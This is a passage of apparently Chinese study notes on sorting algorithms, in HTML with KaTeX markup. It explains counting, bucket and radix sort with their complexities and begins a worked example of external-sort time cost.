encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord">0</span><span class="mord">0</span><span class="mclose">]</span></span></span></span>之间</p></li><li><p>思想</p><p>计数排序是一种非比较排序算法，适用于已知范围内的整数序列。其<mark>基本思想是通过统计每个元素出现的次数，然后累积这些次数来确定每个元素在排序后数组中的位置</mark>。由于它直接对输入数据的值进行计数，所以适合数值范围有限的数据规模。计数排序具有线性时间复杂度，在特定条件下是非常高效的。</p></li><li><p>过程：</p><ul><li>计算并存储每个元素的出现次数。</li><li>累计这些出现次数，计算元素应该放置的位置。</li><li>按照计算的位置将元素放置到输出数组中。</li></ul></li><li><p>时间复杂度：</p><ul><li>初始化和遍历输入数组的时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li><li>计数数组累加的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>,其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>是计数数组的长度</li><li>总的时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n+k)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span></li></ul></li></ul><h4 id="桶排序"><a class="markdownIt-Anchor" href="#桶排序"></a> 桶排序</h4><ul><li><p>基本思想：与计数排序比较类似</p><p>流程是：</p><ul><li>通过<code>映射函数</code>将序列分到有限数量的桶里</li><li>对每个桶进行单独排序</li><li>汇总:依次将各个桶中的值输出</li></ul></li><li><p>例如，对于序列<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>79</mn><mo separator="true">,</mo><mn>29</mn><mo separator="true">,</mo><mn>18</mn><mo separator="true">,</mo><mn>27</mn><mo separator="true">,</mo><mn>23</mn><mo separator="true">,</mo><mn>89</mn><mo separator="true">,</mo><mn>7</mn><mo separator="true">,</mo><mn>56</mn><mo separator="true">,</mo><mn>53</mn><mo separator="true">,</mo><mn>21</mn><mo separator="true">,</mo><mn>48</mn><mo separator="true">,</mo><mn>33</mn><mo separator="true">,</mo><mn>47</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[79,29,18,27,23,89,7,56,53,21,48,33,47]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">7</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span><span class="mord">9</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">5</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord">8</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">4</span><span class="mord">7</span><span class="mclose">]</span></span></span></span></p><p>考虑映射函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>u</mi><mi>m</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mi mathvariant="normal">/</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">num[i]/10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">n</span><span class="mord mathnormal">u</span><span class="mord mathnormal">m</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mord">/</span><span class="mord">1</span><span class="mord">0</span></span></span></span>,然后在每个桶的元素进行排序，然后再输出</p></li><li><p>性能分析</p><ul><li><p>时间复杂度</p><ul><li>最坏情况：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，所有元素都落在同一个桶</li><li>平均情况:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n+m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>,其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>是元素个数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>是桶的数量</li><li>最好情况:<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>,假设元素均匀分布且每个桶都均匀分配</li></ul></li><li><p>空间复杂度</p><p>额外的存储空间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n+m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>即用于存储桶的空间</p></li></ul></li></ul><h4 id="基数排序"><a class="markdownIt-Anchor" href="#基数排序"></a> 基数排序</h4><p><a href="https://blog.csdn.net/qq_53414724/article/details/125015867?app_version=6.3.6&amp;code=app_1562916241&amp;csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22125015867%22%2C%22source%22%3A%22qq_38964801%22%7D&amp;uLinkId=usr1mkqgl919blen&amp;utm_source=app">数据结构算法———基数排序-CSDN博客</a></p><img src="/2024/05/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20240602233638399.png" class="" alt="image-20240602233638399" loading="lazy"><p>讲的很清晰,是计数排序和桶排序的拓展</p><ul><li><p>基本思想：<mark>将整数按位数切割成不同的数字，然后按每个位数分别比较</mark><em><strong>*由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。*</strong></em></p><p>例如给定数组[126,69,593,23,6,89,54,8]</p><p>关键字是3个，需要10个桶</p><p>对个位排序[593,23,54,126,6,8,59,89]</p><p>对十位排序[06,08,23,126,54,59,89,593]</p><p>对百位排序[006,008,023,054,069,089,126,593]</p><p>这个就是<code>LSD</code>法</p></li><li><p>多关键字的排序</p><ul><li><p>最高位优先（Most Sifnificant Digit first)</p><p><mark>从最高位向最低位依次按位进行排序。</mark></p></li><li><p>最低位优先  (Least Significant Digit first)</p><h5 id="从最低位向最高位依次按位进行排序"><a class="markdownIt-Anchor" href="#从最低位向最高位依次按位进行排序"></a> <mark>从最低位向最高位依次按位进行排序。</mark></h5></li></ul><p><mark>注意</mark>这个只是对关键字次序进行排序，并未规定对每个关键字进行排序使用的方法，可以根据不同情形选择合适的排序算法,如果是整数的话，一般跟计数排序结合</p></li><li><p>代码实现:<a href="https://github.com/OneLastChick/DataStructuresAndAlgorithms">OneLastChick/DataStructuresAndAlgorithms: 学习数据结构和算法的记录 (github.com)</a></p></li><li><p><strong>链式基数排序</strong>(Radix Sort)</p><ul><li><p>基本思想：链式基数排序是一种变体基数排序，利用链表处理每个桶中的元素而不是数组。<mark>它适用于输入数据分布较分散的情况，能够有效管理内存动态分配，避免了数组大小的预分配问题。</mark></p><p>将元素根据每个位上的数字分配到不同的桶中，每个桶使用链表实现，逐位处理从最低有效位到最高有效位（或相反），最后将结果合并得到有序的序列。</p></li></ul></li><li><p>性能分析</p><ul><li>对于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">n</span></span></span></span>个记录，(假设每个基数含<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>个关键字，每个关键字的取值范围为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi><mi>d</mi></mrow><annotation encoding="application/x-tex">rd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span></span></span></span>个值)进行链式基数排序的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mi>r</mi><mi>d</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(d(n+rd))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></li><li>其中每一趟分配的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>,每一趟收集的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>r</mi><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(rd)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span>,整个排序需要经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>趟收集分配</li></ul></li></ul><h2 id="chap11-外部排序"><a class="markdownIt-Anchor" href="#chap11-外部排序"></a> Chap11 外部排序</h2><ul><li><p>概念:外存中的数据读入内存-&gt;在内存中排序-&gt;数据写入外存</p></li><li><p>基本思想:采用归并排序的思想和方法</p></li><li><p>基本过程：</p><ol><li>首先，按可用内存大小，将外存上含n个记录的文件分为若干长度为l的段</li><li>依次读入内存并利用内部排序算法重新写入外存，称之为归并段</li><li>对这些外部归并段读入内存进行逐趟归并后写入外存，使归并段逐渐由小到大</li></ol></li><li><p>时间开销:<strong>外部排序所需总的时间=内部排序（产生初始归并段)所需的时间(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>∗</mo><msub><mi>t</mi><mrow><mi>I</mi><mi>S</mi></mrow></msub></mrow><annotation encoding="application/x-tex">m*t_{IS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)+外存信息读写的时间(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mo>∗</mo><msub><mi>t</mi><mrow><mi>I</mi><mi>O</mi></mrow></msub></mrow><annotation encoding="application/x-tex">d*t_{IO}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)+内部归并所需时间(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>∗</mo><mi>u</mi><msub><mi>t</mi><mrow><mi>m</mi><mi>g</mi></mrow></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s*ut_{mg})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></strong></p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span></span></span>是经过内部排序后得到的初始归并段的个数,<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>I</mi><mi>S</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{IS}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是为得到一个归并段经过内部排序所需的时间均值</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi></mrow><annotation encoding="application/x-tex">d</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span></span></span></span>为总磁盘IO次数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mrow><mi>I</mi><mi>O</mi></mrow></msub></mrow><annotation encoding="application/x-tex">t_{IO}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是进行一次读/写时间均值</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span></span></span></span>为归并趟数，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi><msub><mi>t</mi><mrow><mi>m</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">ut_{mg}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9011879999999999em;vertical-align:-0.286108em;"></span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">g</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>为对<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>u</mi></mrow><annotation encoding="application/x-tex">u</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">u</span></span></span></span>个记录进行内部归并所需时间</li></ul><p>例如，假设有10000个记录的文件，每个物理块容纳200个记录，并且有10个初始归并段，计算时间开销?</p><p>首先，有10个初始归并段，那么经过了10次内部排序得到了10个初始归并段，磁盘IO次数为:(10000/200)*2=100</p><p>然后.10个归并段，需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">⌈</mo><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>2</mn></msub><mn>10</mn><mo stretchy="false">⌉</mo></mrow><annotation encoding="application/x-tex">\lceil log_210\rceil</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⌈</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">1</span><span class="mord">0</span><span class="mclose">⌉</span></span></span></span>趟，归并的IO=d*50*2=400,总IO为400+100=500</p><p>因此所需总时间为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mo>∗</mo><mi>t</mi><mi>s</mi><mo>+</mo><mn>500</mn><mo>∗</mo><msub><mi>t</mi><mrow><mi>I</mi><mi>O</mi></mrow></msub><mo>+</mo><mn>4</mn><mo>∗</mo><mn>10000</mn><mo>∗</mo><mi>u</mi><msub><mi>t</mi><mrow><mi>m</mi><mi>g</mi></mrow></msub></mrow><annotation encoding="application/x-tex">10*ts+500*t_{IO}+4*10000*ut_{mg}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69841em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">5</span><span class="mord">0</span><span class="mord">0</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07847em;">I</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord">0</span><span 